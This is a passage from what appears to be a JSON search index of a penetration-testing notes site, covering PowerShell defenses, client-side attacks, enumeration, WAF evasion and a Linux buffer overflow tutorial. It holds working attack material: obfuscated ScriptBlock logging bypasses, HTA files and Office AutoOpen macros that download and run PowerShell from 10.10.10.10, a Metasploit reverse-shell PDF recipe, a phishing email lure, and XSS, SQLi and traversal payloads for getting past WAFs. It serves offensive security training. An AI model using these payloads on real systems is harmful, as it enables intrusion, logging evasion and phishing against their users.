{$GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0$GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$val=[System.Collections.Generic.Dictionary[string,System.Object]]::new()$val.Add('EnableScriptB'+'lockLogging',0)$val.Add('EnableScriptB'+'lockInvocationLogging',0)$GroupPolicyCache['HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB'+'lockLogging']=$val} https: cobbr.io ScriptBlock-Logging-Bypass.html Unload Warning Level Script Block Logging Recall that the Warning level script block logging which is enabled by default uses a lis of known bad words. Turns out the logging can be bypassed for the current session without admin rights by setting the list of signatures field in the ScriptBlock class to null. # The bypass [ScriptBlock].\"GetFiel`d\"('signatures','N'+'onPublic,Static').SetValue($null,(New-ObjectCollections.Generic.HashSet[string])) # To use a base64 encoded payload script with the bypass [ScriptBlock].\"GetFiel`d\"('signatures','N'+'onPublic,Static').SetValue($null,(New-ObjectCollections.Generic.HashSet[string]));[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IgA8AE0AeQAgAHMAdQBzAHAAaQBjAGkAbwB1AHMAIABOAG8AbgBQAHUAYgBsAGkAYwAgAHAAYQB5AGwAbwBhAGQAPgAiAA=='))|iex System-Wide Transcription Enables transciption (console logging) for everything which uses PowerShell engine such as powershell.exe, PowerShell ISE, custom hosts, .NET dll, msbuild, installutil, etc… Can be enabled using Group Policy (GPO). By default transcripts are saved in the user’s “My Documents” directory. Administrative Templates -&gt; Windows Components -&gt; Windows Powershell -&gt; Turn on PowerShell Transcription Set EnableTranscripting to 1 in the following registry: HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription The transcripts are written as text files and can quicly grow in size because the command output is also recorded. It is always recommended to forward the transcirpts to a log system to avoid tampering and running out of disk space. Note: Too many logs in an enterprise level network. Enabling Transcripts on a DC breaks the Active Directory Administartrion Centre GUI application. AMSI AMSI (AntiMalware Scan Interface) provides the registered antivirus access to contents of a script before execution. This allows detection of malicious scripts regardless of input method such as disk, encodedcommand, in-memory. Enabled by-default on Windows 10 and supported by Windows Defender. Note: AMSI has no detection mechanism. It is dependent on the signature based detection by the registered antivirus. Constrained Language Language mode in PoweShell is used to control access to different elements for a PowerShell session. In the constrained language mode, all Windows cmdlets and elements are allowed but allows only limited types. For examples, Add-Type, Win32APIs, COM objects are not allowed. Intended to work with Applocker in Allow mode or UMCI (Device Guard User Mode Code Integrity). When Allow mode is set for scripts in Applocker, the Constrained Language mode kicks-in by itself. Note: Not easy to implement enterprise-wide. JEA (Just Enough Administration) JEA (Just Enough Administration) provides role based access control for PowerShell based remote delegated administration. With JEA non-admin users can connect remotely to machines for doing specific tasks. Focused more on securing privileged access than solving a problem introduced with PowerShell unlike others discussed for far. JEA endpoints have PowerShell transcription and logging enabled. Device Guard Device Guard or Windows Defender Device Guard is a group of features designed to harden a system agains malware attacks. Its focus in preventing malicious code from running by ensuring only known good code can run. Has three main components: Configurable Code Integrity (CCI): Configure only trusted code to run. Virtual Secure Mode Protected Code Integrity: Enforces CCI with Kernel Mode (KMCI) and User Mode (UMCI). Platform and UEFI Secure Boot: Ensures boot binaries and firmware integrity. UMCI is something which interferes with most of the lateral movement attacks we have seen. While it depends on the deployment, many well known applications are whitelisted such as csc.exe, msbuild.exe, etc… More info in: https: docs.microsoft.com es-es windows security threat-protection device-guard requirements-and-deployment-planning-guidelines-for-virtualization-based-protection-of-code-integrity Protected Users Group Protected Users is a gorup introcued in Server 2012 R2 for better protection against credential theft. Credentials of all members of the the protected users group are not cached in a insecure way. A user added to this group: Members cannot use CredSSP or WDigest for authentication so no more cleartext credentials caching. The NTLM hash will not cache the user’s plain text credentials or NT one-way function (NTOWF). Kerberos does not use DES or RCE4 keys. No caching of clear text credentials or long term keys after the initial TGT is acquired. A cached verifier is not created at sig-in or unlock, so offline sign-in is no longer supported. If the domain functional level is Server 2012 R2: No NTLM authentication. No DES or RC4 keys in Kerberos pre-auth. No delegation (constrained or unconstrained). No renewal of TGT beyond initial for hour lifetime. Hardcoded, unconfigurable Maximum lifetime for use ticket and Maximum lifetime for user ticket renewal. Protected accounts and groups in active directory by operating system: User Group Windows Server 2003 RTM Windows Server 2003 SP1+ Windows Server 2012, Windows Server 2008 R2, Windows Server 2008 Windows Server 2016 Account Operators ✓ ✓ ✓ ✓ Administrator ✓ ✓ ✓ ✓ Administrators ✓ ✓ ✓ ✓ Backup Operators ✓ ✓ ✓ ✓ Cert Publishers ✓ × × × Domain Admins ✓ ✓ ✓ ✓ Domain Controllers ✓ ✓ ✓ ✓ Enterprise Admins ✓ ✓ ✓ ✓ Krbtgt ✓ ✓ ✓ ✓ Print Operators ✓ ✓ ✓ ✓ Read-only Domain Controllers × × ✓ ✓ Replicator ✓ ✓ ✓ ✓ Schema Admins ✓ ✓ ✓ ✓ Server Operators ✓ ✓ ✓ ✓ BlueTeam Note: Microsoft do not recommend to add Domain Admins or Enterprise Admins to this group without testing the potential impact of lock out. More info in: https: docs.microsoft.com en-us windows-server security credentials-protection-and-management protected-users-security-group https: docs.microsoft.com en-us windows-server identity ad-ds plan security-best-practices appendix-c–protected-accounts-and-groups-in-active-directory Use of Privileged Administrative Workstations (PAWs) If the user of the IT department which is a Domain Admin is compromised, in that case there is a risk for the infraestructure and the active directory. For that reason the administrator needs to have aparate hardened workstation to permorm sensitive tasks like administration of domain controllers, cloud infraestructure, sensistive business functions etc… This can provide protection from phishing attacks, OS vulnerabilities, credential replay attacks, etc… Admin jump servers should be configured to be accessed only from a PAW. We can apply different strategies: Separate privilege and hardware for administrative and normal tasks. Having a VM on a PAW for user tasks. AD Administrative Tier Model The Active Directory Administrative Tier Model is composed of three levels only for administrative accounts: Tier 1: Accoutns, groups and computers which have privileges across athe enterprise like domain controllers, domain admins, entreprise admins. Tier 2: Accounts, groups and computers which have access to resources having significant amount of business value. A common example role is server administrators who maintain these operating systems with the ability to impact all enterprise servers. Tier 3: Administrator accounts which have administrative control of a significant amount of business value that is hosted on user workstations and devices. Examples include Help Desk and computer support administrators because can impact the integrity of almost any user data. Control Restrictions Control restrictions is what admins can control. Logon Restrictions Logon restrictions is where admins can logon. Enhanced Security Admin Environment (ESAE) Enhanced Security Admin Environment (ESAE) is a dedicated administrative fores for managing critical assets like administrative users, groups and computers. Since a forest is considered a security boundary rather than a domain, this model provides enhanced security controls. The amdinistrative forest is also called the Red Forest. Administrative users in a production forest are used as standard non-privileged users in the administrative forest. Selective authentication to the Red Forest enables stricter security controls and logon of users from non-administrative forests. Deception (Decoy)"
					}

					
				
			
		
			
				
					,
					

					"client-side-attacks-evil-pdf": {
						"id": "client-side-attacks-evil-pdf",
						"title": "Evil PDF",
						"category": "",
						"url": " /client-side-attacks/evil-pdf/",
						"content": "An Evil PDF is a pdf with malware inside. Introduction PDF, or Portable Document Format, is an extraordinarily intricate file format, represented by numerous models and semi-principles. Like HTML and CSS, it was intended for document layout and introduction. Additionally, like HTML and CSS, it has been expanded with a JavaScript motor and document API that enables developers to transform PDF reports into applications — or agents for malware. Among the most generally utilized Adobe items is Reader. Almost every PC has some variant of Adobe Reader on it for perusing PDFs. You presumably have it, as well. However, most people are ignorant of the security issues that Reader has encountered — and they neglect to upgrade or fix it. Creating the Evil PDF file I will use meterpreter to compromise the client and get a reverse shell. msf6 &gt; use exploit windows fileformat adobe_pdf_embedded_exe We need to set some variables: set FILENAME Not_Evil.pdf set INFILENAME root Downloads ESP8266_datasheet.pdf set LAUNCH_MESSAGE Couldn't open PDF: Something's keeping this PDF from opening set LPORT &lt;port&gt; set LHOST &lt;ip&gt; set PAYLOAD windows shell_reverse_tcp run Finally a PDF is created with malware. A reverse shell will be prompted once the victim execute the file with an outdated Adobe Reader. References https: medium.com purple-team embedding-backdoor-into-pdf-files-1781dfce62b1"
					}

					
				
			
		
			
				
					,
					

					"client-side-attacks-html-application": {
						"id": "client-side-attacks-html-application",
						"title": "HTML Application (HTA)",
						"category": "",
						"url": " /client-side-attacks/html-application/",
						"content": "An HTML Application (HTA) is a proprietary Windows program whose source code consists of HTML and one or more scripting languages supported by Internet Explorer (VBScript and JScript). The HTML is used to generate the user interface and the scripting language for the program logic. An HTA executes without the constraints of the browser’s security model, so it executes as a “fully trusted” application. An HTA file is executed using mshta.exe, which is typically installed along with Internet Explorer. Note: mshta is dependant on Internet Explorer, so if it has been uninstalled, HTAs will be unable to execute. HTA files has the .hta extension. Executing x64 powershell payload &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello World&lt; title&gt; &lt; head&gt; &lt;body&gt; &lt;h2&gt;Hello World&lt; h2&gt; &lt;p&gt;This is an HTA...&lt; p&gt; &lt; body&gt; &lt;script language=\"VBScript\"&gt; Function Magic() Set shell = CreateObject(\"wscript.Shell\") shell.run \"C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \"\"IEX ((new-object net.webclient).downloadstring('http: 10.10.10.10 a'))\"\"\" End Function Magic &lt; script&gt; &lt; html&gt; Checking the architecture and executing powershell payload &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello World&lt; title&gt; &lt; head&gt; &lt;body&gt; &lt;h2&gt;Hello World&lt; h2&gt; &lt;p&gt;This is an HTA...&lt; p&gt; &lt; body&gt; &lt;script language=\"VBScript\"&gt; Function Magic() Set shell = CreateObject(\"wscript.Shell\") If shell.ExpandEnvironmentStrings(\"%PROCESSOR_ARCHITECTURE%\") = \"AMD64\" Then shell.run \"powershell.exe -nop -w hidden -c \"\"IEX ((new-object net.webclient).downloadstring('http: 10.10.10.10 a'))\"\"\" Else shell.run \"powershell.exe -nop -w hidden -c \"\"IEX ((new-object net.webclient).downloadstring('http: 10.10.10.10 b'))\"\"\" End If End Function Magic &lt; script&gt; &lt; html&gt; Phishing By default, Outlook has filetype filtering in order to prevent you from attaching certain files to emails. Instead of attaching, we can just host the file on a server and send a link to the victim. &lt;html&gt; &lt;body&gt; &lt;p&gt;Hi Miguel,&lt; p&gt; &lt;p&gt;Please fill this &lt;a href=\" staff\"&gt;form&lt; a&gt; as soon as possible.&lt; p&gt; &lt;p&gt;Best regards,&lt; p&gt; &lt; body&gt;&lt; html&gt;"
					}

					
				
			
		
			
				
					,
					

					"client-side-attacks-microsoft-office-macros": {
						"id": "client-side-attacks-microsoft-office-macros",
						"title": "Microsoft Office Macros",
						"category": "",
						"url": " /client-side-attacks/microsoft-office-macros/",
						"content": "Visual Basic for Applications (VBA) Macro VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc. VBA is not all that different from VBScript, so it’s not too difficult to use the wscript.shell object. Note: The file must be saved in .doc format due inside .docx files cannot save macros. To create a macro go to View -&gt; Macros and create one. Note: It’s important to select the document in order to save the macro inside. Sub AutoOpen() Dim Shell As Object Set Shell = CreateObject(\"wscript.shell\") Shell.Run \"calc\" End Sub Note: To force the macro to trigger automatically when the document is opened, use the nameAutoOpen(). Executing a Powershell Payload Sub AutoOpen() Dim Shell As Object Set Shell = CreateObject(\"wscript.shell\") shell.run \"C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \"\"IEX ((new-object net.webclient).downloadstring('http: 10.10.10.10 a'))\"\"\" End Sub Changing Prent-Child Relationship When a powershell is executed from a word macro a child powershell.exe process is created from winword.exe (MS Word as a Parent). This isn’t normal behaviour and highly suspicious. With wmi we can create another parent process and append the powershell to wmi and not to the MS Word. Dim proc As Object Set proc = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\") proc.Create \"powershell\" OPSEC Note: In that case, powershell will be a child of WmiPrvSE.exe rather than MS Word. Remote Template Injection Microsoft Word has the option of creating a new document from a template. Office has some templates pre-installed. Remote template injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious script. Create a word add a macro and save it as Word 97-2003 Template (.dot). This will be out malicious remote template, and we can also host this file. Next, create a new document from the blank template located in C:\\Users\\User\\Documents\\Custom Office Templates. Add any content and save it as .docx. Browse to the directory in explorer, right-click and select 7-zip -&gt; Open Archive. Navigate to word -&gt; _rels, right-click on settings.xml.rels and select Edit. Change the Target entry and specify out hosted template. Target=\"http: 10.10.10.10 template.dot\" This will allow to execute the macro even if its flagged with MOTW."
					}

					
				
			
		
			
				
					,
					

					"enumeration-dns-enumeration": {
						"id": "enumeration-dns-enumeration",
						"title": "DNS Enumeration",
						"category": "",
						"url": " /enumeration/dns-enumeration/",
						"content": "The Domain Name System (DNS) is on of the most critical systems on the Internet and is a distributed database responsible for translating user-friendly domain names into IP addresses. Interacting with DNS servers DNS queries produce listintgs calles Resource Records. This is a representation of Resource Records: DNS Lookup A DNS lookup is the simplest query a DNS server can receive. Its asks the DNS to resolve a given hostname. nslookup [Domain] dig [Domain] host [DOMAIN] Once we retrieved all the IP addresses corresponding to the domains, we need to consider two things: Is this IP address hosting only that given domain? It is possible that more than one domain is configured on the same IP address, even if a PTR record is not set. This is also typical in corporate networks where multiple subdomains run on the same web server. First thing to try is reverse lookup and the second is search on google or bing: bing&gt; ip:[IP] Who does this IP address belongs to? To search the owner of an IP address we can use whois.arin.net or one of the WHOIS tools seen earlier In order to collect the highest number of domains and subdomain related to the target organization, we can use different techniques: DNS Lookup MX Lookup Zone transfers Reverse DNS Lookup With Reverse DNS Lookup, we will recieve the IP address associated to a given domain name. This process queries for DNS pointer records (PTR). nslookup -type=PTR [IP] dig [Domain] PTR or use online tools: https: network-tools.com nslookup Mail Exchange Lookup With MX(Mail Exchange) lookup, we retrieve a list of servers responsible for delivering emails for that domain: nslookup -type=MX [Domain] dig [Domain] MX or use online tools: https: www.dnsqueries.com https: www.mxtoolbox.com Zone Transfers Zone transfers are usually a misconfiguration of the remote DNS server. They should be enabled only for trusted IP addresses. Whe zone transfers are enabled, we can enumerate the entire DNS record for that zone. This includes all the sub domains (A records). nslookup -type=NS [Domain] dig [Domain] NS host -t ns [Domain] There are usually two name servers. Take note of both of them an run the next command to show all A records: nslookup -query=AXFR [Domain] [Nameserver] dig axfr [Nameserver] [Domain] host -l [Domain] [Nameserver] dnsrecon -d [Domain] -axfr Another technique to discover A records if Zone transfers are well configured is to bruteforce them with a most common subdomain names: fierce -dns [Domain] -dnsserver [Nameserver] -f [Wordlist] dnsmap [Domain] dnsrecon -d [Domain] -D [Wordlist] -t brt"
					}

					
				
			
		
			
				
					,
					

					"enumeration-host-discovery": {
						"id": "enumeration-host-discovery",
						"title": "Host Discovery",
						"category": "",
						"url": " /enumeration/host-discovery/",
						"content": "When we have our pool of IP addresses, we have to identify the devices and the roles played by each IP in the target organization. Live Hosts There are different methods that one can use to identify live hosts. ICMP Ping Sweep The most common is the ICMP ping sweep. It consists of ICMP ECHO requests sent to multiple hosts. If a given host is alive, it will return an ICMP ECHO reply. fping -a -g [IP-Range] [Mask] nmap -sn [IP-Range] [Mask] -oG ping-sweep.nmap grep \"Up\" ping-sweep.nmap | cut -d \" \" -f 2 Note: For internal Audits, when a host reply a ping shown by fping and doesn’t reply for nmap command this could be a router or switch. Other technic to detect live hosts with ICMP Ping sweep is with this script: #! bin bash for i in $(seq 1 255); do timeout 1 bash -c \"ping -c 1 10.10.10.$i\" &gt; dev null &amp;&amp; echo \"10.10.10.$i - Active\" &amp; done; wait Most common ports The second technique is doing a most common port scanner with the following ports: 22 - SSH 80 - HTTP 443 - HTTPS 445 - SMB nmap -p 22,445,80,443 [IP-Range] [Mask]"
					}

					
				
			
		
			
				
					,
					

					"enumeration-os-discovery": {
						"id": "enumeration-os-discovery",
						"title": "OS Discovery",
						"category": "",
						"url": " /enumeration/os-discovery/",
						"content": "Some tips to discover the operative system that runs on the target machine. TTL The default values of TTL on a ICMP packet, shown in the following table, can help us to identify the operative system: Operative System TTL Windows 128 Linux 64 Solaris AIX 254 OpenBSD 255 FreeBSD 5.0 64 FreeBSD 3.4, 4.0 255 Cisco 254 The following example is for a Linux device: ❯ ping localhost PING localhost(localhost (::1)) 56 data bytes 64 bytes from localhost (::1): icmp_seq=1 ttl=64 time=0.053 ms 64 bytes from localhost (::1): icmp_seq=2 ttl=64 time=0.051 ms"
					}

					
				
			
		
			
				
					,
					

					"enumeration-port-scanning": {
						"id": "enumeration-port-scanning",
						"title": "Port Scanning",
						"category": "",
						"url": " /enumeration/port-scanning/",
						"content": "The best option to identify Ports, Protocols, and Services (PPS) on a targetwould be to scan all ports (65535) of the remote system. TCP Scanning Nmap Simply Scan nmap -p- --open T5 -v -n IP nmap --top-ports 5000 --open -T5 -v -n IP Complex Scan nmap -sV -A -p PORTS IP Masscan Masscan is the fastest port scanner, it can scan the whole internet in 6 minutes. sudo masscan -p[PORTS] [IP MASK] --rate=1000 -e [IFACE] --router-ip [GATEWAY] Bash Port Scanner This one is created by @s4vitar: #! bin bash # Usage . portScanner.sh IP trap ctrl_c INT function ctrl_c(){ echo -e \"\\n\\n[*] Exiting....\\n\" tput cnorm; exit 0 } for port in $(seq 1 65535);do timeout 1 bash -c \"echo '' &lt; dev tcp $1 $port\" 2&gt; dev null &amp;&amp; echo \"Port $port - OPEN\" &amp; done; wait tput cnorm UDP Scanning Pentesters often forgot to scan for open UDP ports, although UDP scanning can be unrealiable, there are plenty of attack vectors lurking behind open UDP ports. sudo nmap -sU IP Hint: You can launch a syn scan and udp scan at same time: sudo nmap -sS -sU IP"
					}

					
				
			
		
			
				
					,
					

					"enumeration-waf-evasion": {
						"id": "enumeration-waf-evasion",
						"title": "WAF Evasion",
						"category": "",
						"url": " /enumeration/waf-evasion/",
						"content": "In this section I will explain techniques to found the original IP of the hosted webapp. SSL Certificates First we need to look inside the SSL Certificate of the webapp in order to find the fingerprint (SHA256) With censys you can search different hosted webpages with the same SSL fingerprint, so these are from the same company. https: censys.io certificates Once you obtained the different domains or IPs that have the same fingerprint try to discover the IPs and play with the Host HTTP header. curl -kv https: 190.12.34.42 It’s common that the companies buys a range of IPs, so you should need to check more parent IPs. curl -kv https: 190.12.34.40 curl -kv https: 190.12.34.41 curl -kv https: 190.12.34.43 curl -kv https: 190.12.34.44 curl -kv https: 190.12.34.45 curl -kv https: 190.12.34.46 DNS History Some times the companies put a WAF on a web application, but they don’t configure it properly and any source IP instead of only the WAF can request the server. So we can check the DNS history with viewdnsinfo to search the old IP. https: viewdns.info iphistory Finally with suip.biz we can check which apps are hosted on a server. https: suip.biz ?act=hostmap Via SMTP Functionalities SMTP headers can reveal a lot of value information. If a SMTP functionality is found on the web appliaction try to send a mail to a known recipient to check these headers in order to find the real webserver IP. Bypassing blacklisting WAFs The whitelisting mode is prone to false positives, which is the reason it is very common to find WAFs deployed in blacklisting mode rather than whitelisting mode. The blacklisting mode is a collection of well-known attacks. WAF producers put together a list of rules to protect a web application against various attack vectors that are used to exploit the most common vulnerabilities. So we can use different payloads to bypass some filters. Cross-Site Scripting (XSS) Instead of using alert('xss') or alert(1) we can choose a better option: prompt('xss') prompt(8) confirm('xss') confirm(8) alert( xss .source) window[ alert .source](8) Instead of using alert(document.cookie) we can use: with(document)alert(cookie) alert(document['cookie']) alert(document[ cookie .source]) alert(document[ coo .source+ kie .source]) Instead of using &lt;img src=x onerror=alert(1);&gt; we can use: &lt;svg onload=alert(1)&gt; &lt;video src=x onerror=alert(1);&gt; &lt;audio src=x onerror=alert(1);&gt; Instead of javascript:alert(document.cookie) we can use: data:text html:base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4= Blind SQL Injection (Blind SQLi) Instead of using ' or 1=1 we can use: ' or 6=6 ' or 0x47=0x47 or char(32)='' or 6 is not null Instead of UNION SELECT we can use: UNION ALL SELECT Directory Traversal Instead of using etc passwd we can use: too .. etc far .. passwd etc passwd etc ignore .. passwd etc passwd....... Web Shell Instead of using c99.php , r57.php , shell.aspx , cmd.jsp, CmdAsp.asp we can use: augh.php WAF Detection and Fingerprinting WAF systems leave several footprints of their presence, which allow us to detect which WAF is in place. wafw00f is a tool that can detect up to 20 different WAF products. wafw00f www.example.com Also it can be possible to detect the WAF vendor with a nmap script. nmap --script=http-waf-fingerprint www.imperva.com -p 80 Cookie Values Some WAF systems reveal their presence through cookies. WAF Vendor Cookies Citrix Netscaler n_saf, citrix_ns_id or NSC_ F5 BIG-IP ASM ^TS[a-zA-Z0-9]{3,6} Barracuda barra_counter_session and BNI__BARRACUDA_LB_COOKIE Header Rewrite Some WAFs rewrite the HTTP headers. Usually modify the Server header. Original Request HTTP 1.1 200 OK Date: Mon, 7 Apr 2014 10:10:50 GMT Server: Apache (Unix) Content-Type: text html Content-Length: 2506 Modified Request HTTP 1.1 404 Not Found Date: Mon, 7 Apr 2014 10:11:06 GMT Server: Netscape-Enterprise 6.1 Content-Type: text html; Content-Length: 158"
					}

					
				
			
		
			
				
					,
					

					"exploiting-bof-linux": {
						"id": "exploiting-bof-linux",
						"title": "Linux BoF 32bit",
						"category": "",
						"url": " /exploiting/bof-linux/",
						"content": "Tools Usage ltrace ltrace is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are executed. $ ltrace . login __libc_start_main(0x8049192, 1, 0xff8f56d4, 0x8049260 &lt;unfinished ...&gt; puts(\"Enter admin password: \"Enter admin password: ) = 23 gets(0xff8f55f6, 0xf7f808cb, 0xf7d3fa2f, 0x80491a9password ) = 0xff8f55f6 strcmp(\"password\", \"pass\") = 1 puts(\"Incorrect Password!\"Incorrect Password! ) = 20 printf(\"Successfully logged in as Admin \"..., 25714Successfully logged in as Admin (authorised=25714) :) ) = 54 +++ exited (status 0) +++ As you can see the binary compares my password password with pass which should be the admin password. Ghidra (Decompiler + Disassembler) Ghidra is a very useful tool to decompile the binary and obtain a close version of the source code. GDB + Peda + Pwndbg (Debugger + Disassembler) Once installed and configured we just need to launch gdb. https: infosecwriteups.com pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8 $ gdb-peda gdb-peda$ $ gdb-pwndbg pwndbg&gt; Opening the file First we need to select the binary. gdb-peda$ file . vuln Reading symbols from . vuln... (No debugging symbols found in . vuln) Check functions We can see what function are in there. gdb-peda$ info functions All defined functions: Non-debugging symbols: 0x08049000 _init 0x08049030 gets@plt 0x08049040 puts@plt 0x08049050 __libc_start_main@plt 0x08049060 _start 0x080490a0 _dl_relocate_static_pie 0x080490b0 __x86.get_pc_thunk.bx 0x080490c0 deregister_tm_clones 0x08049100 register_tm_clones 0x08049140 __do_global_dtors_aux 0x08049170 frame_dummy 0x08049172 main 0x080491c0 __libc_csu_init 0x08049220 __libc_csu_fini 0x08049221 __x86.get_pc_thunk.bp 0x08049228 _fini Disassemble a function gdb can also disassemble a function. gdb-peda$ disassemble main Dump of assembler code for function main: 0x08049192 &lt;+0&gt;: lea ecx,[esp+0x4] 0x08049196 &lt;+4&gt;: and esp,0xfffffff0 0x08049199 &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x0804919c &lt;+10&gt;: push ebp 0x0804919d &lt;+11&gt;: mov ebp,esp 0x0804919f &lt;+13&gt;: push ebx 0x080491a0 &lt;+14&gt;: push ecx 0x080491a1 &lt;+15&gt;: sub esp,0x10 Set breakpoints We can set breakpoints in execution to stop the program in a function. gdb-peda$ break main Breakpoint 1 at 0x8049181 Or we can set a breakpoint in a address using the hex value or the ascii value. gdb-peda$ break *0x804921e Breakpoint 2 at 0x804921e gdb-peda$ break *main+140 Breakpoint 1 at 0x804921e We can also delete breakpoints gdb-peda$ delete breakpoints To move between instructions we can use n to go next, and c to continue. Run the program gdb-peda$ run Stack Info We can also retrieve which data is stored on the stack. gdb-peda$ info stack #0 0x08049181 in main () #1 0xf7dd4fd6 in __libc_start_main () from lib i386-linux-gnu libc.so.6 #2 0x08049092 in _start () Create and Read patterns A common task is to determine the offset of our payload. Create a pattern pwndbg&gt; cyclic 100 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa Get the offset ``` pwndbg&gt; cyclic -l haaa Finding cyclic pattern of 4 bytes: b’haaa’ (hex: 0x68616161) Found at offset 28 ## Pwntools `pwn` is a python library that is designed to create exploits. ```python from pwn import * Exploiting local files: In order to start a program we need to use process function. io = process('. file') Connecting remotely io = remote('10.10.10.10', 80) Recieve line: io.recvline() Send payload: io.send(b'PAYLOAD\\r\\n') Send String after a char: io.sendlineafter(b':', b'PAYLOAD') Recieve output: io.recvall().decode() Debug template There is a custom template that is very useful to change between LOCAL, GDB, REMOTE &lt;IP&gt; &lt;PORT&gt;. from pwn import * # Allows you to switch between local GDB remote from terminal def start(argv=[], *a, **kw): if args.GDB: # Set GDBscript below return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: # ('server', 'port') return remote(sys.argv[1], sys.argv[2], *a, **kw) else: # Run locally return process([exe] + argv, *a, **kw) # Specify your GDB script here for debugging gdbscript = ''' init-pwndbg break main continue '''.format(**locals()) # Set up pwntools for the correct architecture exe = '. ret2win' # This will automatically get context arch, bits, os etc elf = context.binary = ELF(exe, checksec=False) # Change logging level to help with debugging (error warning info debug) context.log_level = 'debug' # =========================================================== # EXPLOIT GOES HERE # =========================================================== io = start() Ropper (Find Gadgets) Sometimes we need to find some gadgets to overwrite some registers or simply to jump to the stack and execute our shellcode. ropper is a useful tool from pwntools that search the desired gadget Example of usage: $ ropper --file server --search \"jmp esp\" [INFO] Load gadgets from cache [LOAD] loading... 100% [LOAD] removing double gadgets... 100% [INFO] Searching for gadgets: jmp esp [INFO] File: server 0x0804919f: jmp esp; Check Architecture With file we can check with which architecture we are going to work. $ file vuln vuln: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter lib ld-linux.so.2, for GNU Linux 3.2.0, BuildID[sha1]=c5631a370f7704c44312f6692e1da56c25c1863c, not stripped Binary Security checksec is very usefull to see what defenses are enabled in the compiled binary. $ checksec vuln [*] ' tmp vuln' Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Address Space Layout Randomization (ASLR): ASLR is the randomization of the place in memory where the program, shared libraries, the stack, and the heap are. This makes can make it harder for an attacker to exploit a service, as knowledge about where the stack, heap, or libc can’t be re-used between program launches. This is a partially effective way of preventing an attacker from jumping to, for example, libc without a leak. RELRO: Relocation Read-Only is a security measure which makes some binary sections read-only. There are two RELRO modes, partial and full. Partial RELRO is the default setting in gcc, eliminates the risk of a BOF on a global variable overwriting Global Offset Table (GOT) entries. Full RELRO makes the entire GOT read-only which removes the ability to perform a “GOT overwirte” attack. Stack Canaries: Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately. Stack Canaries seem like a clear cut way to mitigate any stack smashing as it is fairly impossible to just guess a random 64-bit value. However, leaking the address and bruteforcing the canary are two methods which would allow us to get through the canary check. No eXecute (NX): The No eXecute or the NX bit (also known as Data Execution Prevention or DEP) marks certain areas of the program as not executable, meaning that stored input or data cannot be executed as code. This is significant because it prevents attackers from being able to jump to custom shellcode that they’ve stored on the stack or in a global variable. Position Independent Executable (PIE): Every time the file is runned it gets loaded into a different memory address. This means that you cannot hardcode values such as function addresses and gadget locations without finding out where they are. Compile with no protections If we have the source code (C), we can compile it with any protection. gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32 Overwriting Stack Variables In some CTFs we need to overwrite a variable which is on the stack with a buffer overflow in order to get the flag. After finding the user input which is vulnerable to BOF we need to fuzz in order to find the modification of the variable. Example of a fuzzer using pwntools: from pwn import * for length in range(100): print(\"---- LENGTH %d\" % length) io = process('. overwrite') payload = length * b'A' print(payload) io.sendlineafter(b'?', payload) print(io.recvall().decode()) ---- LENGTH 31 [+] Starting local process '. overwrite': pid 15721 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' [+] Receiving all data: Done (14B) [*] Process '. overwrite' stopped with exit code 0 (pid 15721) 12345678 ... ---- LENGTH 32 [+] Starting local process '. overwrite': pid 15724 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' [+] Receiving all data: Done (14B) [*] Process '. overwrite' stopped with exit code 0 (pid 15724) 12345600 ... ---- LENGTH 33 [+] Starting local process '. overwrite': pid 15727 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' [+] Receiving all data: Done (14B) [*] Process '. overwrite' stopped with exit code 0 (pid 15727) 12340041 ... As you can see after 32 dummy bytes the output variable has been modified. To confirm we can create a exploit to control de variable. from pwn import * io = process('. overwrite') payload = 32 * b'A' + b'BBBB' io.sendlineafter(b'?', payload) print(io.recvall().decode()) Output: $ python3 myexploit.py [+] Starting local process '. overwrite': pid 20032 [+] Receiving all data: Done (14B) [*] Process '. overwrite' stopped with exit code 0 (pid 20032) 42424242 ... Once we fully control the variable we need to reverse the binary in order to find which value we need to set into. After setting a breakpoint in the direction where the variable is compared we can see the desired value. ────────────────────────────────────────────────[ DISASM i386 set emulate on ]───────────────────────────────────────────────── ► 0x80491e0 &lt;do_input+78&gt; cmp dword ptr [ebp - 0xc], 0xdeadbeef 0x80491e7 &lt;do_input+85&gt; jne do_input+148 &lt;do_input+148&gt; ↓ 0x8049226 &lt;do_input+148&gt; sub esp, 8 0x8049229 &lt;do_input+151&gt; push dword ptr [ebp - 0xc] 0x804922c &lt;do_input+154&gt; lea eax, [ebx - 0x1fe7] 0x8049232 &lt;do_input+160&gt; push eax 0x8049233 &lt;do_input+161&gt; call printf@plt &lt;printf@plt&gt; 0x8049238 &lt;do_input+166&gt; add esp, 0x10 0x804923b &lt;do_input+169&gt; sub esp, 0xc 0x804923e &lt;do_input+172&gt; lea eax, [ebx - 0x1fe1] 0x8049244 